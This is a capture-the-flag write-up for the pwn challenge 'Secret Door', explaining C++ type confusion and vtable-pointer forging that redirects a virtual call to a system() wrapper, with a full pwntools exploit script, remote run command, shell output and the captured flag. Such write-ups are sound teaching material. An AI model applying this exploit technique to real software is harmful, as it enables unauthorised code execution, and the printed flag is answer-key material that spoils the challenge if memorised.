# Secret Door — Writeup

**Category:** Pwn  
**Points:** 500  
**Target:** `inst.thryvectf.org:10034`

## The short version

The anime player stores C++ objects, but it does not consistently check what
kind of object it is using. One menu option lets us create a "raw config" with
a vtable pointer of our choice, while another option treats that raw config as
a real `AnimeStream` and writes a command into it.

By shifting a leaked, legitimate vtable pointer by `0x18`, I made the program
call its own hidden `execute_stream()` function instead of the normal
`play()` function. `execute_stream()` passes the object's URL field directly
to `system()`, so putting `/bin/sh` in that field gives a shell.

In plain English: the program lets us replace the object's instruction list,
and we point "play" at a function that runs shell commands.

## Initial recon

First I checked the binary and its mitigations:

```console
$ file anime_player
anime_player: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec --file=anime_player
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

That looks fairly locked down:

- **PIE/ASLR** moves the program to a different address each run.
- **NX** prevents simply placing executable code in writable memory.
- **Full RELRO** prevents easy GOT overwrites.
- **Canary** makes ordinary stack smashing harder.

Fortunately, none of those protections stop us from making the program call
one of its own existing functions.

The binary is also not stripped, so useful names remain visible:

```text
add_anime()
add_raw_config()
update_anime_url()
export_media()
play_media()
AnimeStream::play()
AnimeStream::execute_stream()
```

The presence of `system()` and a function named `execute_stream()` immediately
made that function worth inspecting.

## A quick vtable explanation

C++ classes can have **virtual functions**. Each object then starts with a
hidden pointer called a **vptr**, which points to a table of function addresses
called the **vtable**.

You can think of it like an object's remote control:

```text
object -> vtable -> show_info function
                  -> play function
                  -> destructor
                  -> ...
```

When the program calls `object->play()`, it effectively does something like:

```c
object->vptr[1](object);
```

If we control `object->vptr`, we control which address is called.

## The useful menu options

The player keeps everything in one `std::vector<void *>`. Using `void *`
throws away type information: the vector itself cannot tell whether an entry
is a genuine `AnimeStream` or a user-created raw config.

Four options combine into the exploit.

### 1. Add Anime Stream

This creates a legitimate `AnimeStream`. We need one so that we can leak a
valid vtable address.

### 7. Export Media Header

This option prints both the object and vtable addresses:

```text
Object Address: 0x55be886adeb0
Vtable Pointer: 0x55be8383bca8
```

That defeats the important part of PIE for us: we now know where the real
vtable landed in memory. Even better, the final exploit only needs an offset
from this leak, so it does not need a libc leak or even the exact PIE base.

### 2. Add Raw Stream Config

This allocates a raw object and asks for:

```text
Target Vtable Ptr (hex):
Slot 0 (hex):
Slot 1 (hex):
```

The first value becomes the object's vptr. In other words, this menu option
directly gives us vtable-pointer control.

### 6. Update Anime Stream URL

Despite its name, this function does not verify that the chosen inventory
entry is actually an `AnimeStream`. It always writes the new URL at:

```text
object + 0x5c
```

That means it also writes at offset `0x5c` inside our raw object.

## The hidden door: `execute_stream()`

Disassembly shows that `AnimeStream::execute_stream()` uses that same field:

```asm
lea rbx, [rdi+0x5c]    ; address of the URL/command field
...
mov rdi, rbx
jmp system@plt         ; system(object + 0x5c)
```

So, conceptually, the function is:

```cpp
void AnimeStream::execute_stream() {
    system(this->url);
}
```

If we can redirect a virtual call to this function, the URL becomes a shell
command.

## Shifting the vtable

Starting from the leaked genuine vptr, the relevant table layout is:

```text
real_vptr + 0x00  -> show_info()
real_vptr + 0x08  -> play()
real_vptr + 0x10  -> destructor
real_vptr + 0x18  -> deleting destructor
real_vptr + 0x20  -> execute_stream()
```

`play_media()` calls the entry at `vptr + 0x08`. I want that lookup to land
on the genuine table's `execute_stream` entry at `real_vptr + 0x20`.

Therefore:

```text
fake_vptr + 0x08 = real_vptr + 0x20
fake_vptr        = real_vptr + 0x18
```

This is the main trick. We do not have to build a fake table in the heap or
know the address of `system()`. We simply point into the middle of the real
vtable at a carefully chosen offset.

The supplied local binary and the remote service had slightly different
absolute ELF offsets, which made an ELF-based "PIE base" estimate look
unaligned remotely. That did not matter: the relationship between the leaked
vptr and `execute_stream` was still `+0x20`, and the exploit is entirely
relative to the leak.

## Exploitation steps

The final sequence is:

1. Add a genuine anime object at index 0.
2. Export index 0 and read its vtable pointer.
3. Add a raw config at index 1 with `vptr = leaked_vptr + 0x18`.
4. Use "Update Anime Stream URL" on index 1 and write `/bin/sh` at offset
   `0x5c`.
5. Play index 1.
6. The program looks up the raw object's `play` slot, lands on
   `execute_stream()`, and runs `system("/bin/sh")`.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./anime_player", checksec=False)


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(exe.path)


def menu(io, choice):
    io.sendlineafter(b"Choice > ", str(choice).encode())


def add_anime(io):
    menu(io, 1)
    io.sendlineafter(b"Title: ", b"probe")
    io.sendlineafter(b"Episode: ", b"1")
    io.sendlineafter(b"URL: ", b"https://x")


def export(io, index):
    menu(io, 7)
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b"Object Address: ")
    obj = int(io.recvline(), 16)
    io.recvuntil(b"Vtable Pointer: ")
    vptr = int(io.recvline(), 16)
    return obj, vptr


def add_raw(io, vptr):
    menu(io, 2)
    io.sendlineafter(b"Target Vtable Ptr (hex): 0x", f"{vptr:x}".encode())
    io.sendlineafter(b"Slot 0 (hex): 0x", b"0")
    io.sendlineafter(b"Slot 1 (hex): 0x", b"0")


def update_url(io, index, value):
    menu(io, 6)
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"New URL: ", value)


io = start()

# Create a real object and leak its legitimate vtable pointer.
add_anime(io)
obj, real_vptr = export(io, 0)
log.info(f"object = {obj:#x}")
log.info(f"real vptr = {real_vptr:#x}")

# play_media reads fake_vptr[1]. Shifting by 0x18 makes that entry point to
# execute_stream at real_vptr + 0x20.
add_raw(io, real_vptr + 0x18)

# The unchecked update writes our command to raw_object + 0x5c.
update_url(io, 1, b"/bin/sh")

# Trigger the forged virtual call.
menu(io, 4)
io.sendlineafter(b"Index: ", b"1")
io.interactive()
```

Run it with:

```console
$ python3 solve.py REMOTE HOST=inst.thryvectf.org PORT=10034
```

## Getting the flag

The exploit returned a shell:

```console
[+] Stream engine launching media processor for: /bin/sh
$ ls
Makefile
bin
entrypoint.sh
flag.txt
src
$ cat flag.txt
Thryve{31908972-e4a3-451e-8cba-a5738ba9b6da}
```

## Flag

```text
Thryve{31908972-e4a3-451e-8cba-a5738ba9b6da}
```

## Takeaway

This challenge is a nice example of C++ type confusion and vtable abuse. The
program has modern binary protections, but its own logic hands us everything
we need: an address leak, control of an object's vptr, an unchecked write into
that object, and an existing function that calls `system()`.

No shellcode and no libc calculation were necessary—just one carefully
shifted pointer.
